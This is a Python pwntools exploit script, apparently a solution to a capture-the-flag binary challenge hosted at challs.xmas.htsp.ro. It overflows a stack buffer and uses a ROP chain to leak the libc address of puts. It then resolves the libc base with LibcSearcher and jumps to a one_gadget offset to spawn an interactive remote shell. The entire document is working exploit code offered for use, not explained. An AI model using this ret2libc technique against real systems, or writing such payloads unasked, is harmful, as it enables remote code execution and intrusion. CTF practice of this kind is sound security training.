#!/usr/bin/env python
# -*- coding: utf-8 -*-
from LibcSearcher import *
from pwn import *

debug = 0
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./chall')
else:
    p = remote('challs.xmas.htsp.ro', 12006)
elf = ELF('./chall', checksec=False)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
addr_rdi = 0x401273
addr_main = 0x401167


pd = 'a' * 0x12
pd += p64(addr_rdi)
pd += p64(got_puts)
pd += p64(plt_puts)
pd += p64(addr_main)
p.sendlineafter('Helloooooo, do you like to build snowmen?\n', pd)
p.recvuntil('Mhmmm... Boring...\n')
addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('puts', addr_puts)
#  1: http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
libcbase = addr_puts - libc.dump('puts')
addr_one_daget = libcbase + libc_one_gadget[0]

pd = 'a' * 0x12
pd += p64(addr_one_daget)
p.sendlineafter('Helloooooo, do you like to build snowmen?\n', pd)
p.recvuntil('Mhmmm... Boring...\n')
success('addr_puts   = ' + hex(addr_puts))
p.interactive()
